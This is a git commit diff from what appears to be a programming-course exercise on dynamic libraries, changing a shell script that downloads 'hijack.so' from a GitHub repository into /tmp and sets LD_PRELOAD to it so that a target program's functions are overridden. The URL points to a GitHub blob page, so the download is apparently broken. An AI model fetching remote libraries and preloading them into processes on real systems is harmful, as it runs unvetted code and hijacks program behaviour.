b539fbf7cda93d4038a1d318c70eb584b3070b6d
Goodness <atundeg@gmail.com>
2021-12-03 12:58:57 +0100

    modified path

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp https://github.com/goody-1/alx-low_level_programming/blob/main/0x18-dynamic_libraries/hijack.so
+wget -O /tmp/hijack.so https://github.com/goody-1/alx-low_level_programming/blob/main/0x18-dynamic_libraries/hijack.so
 export LD_PRELOAD=/tmp/hijack.so
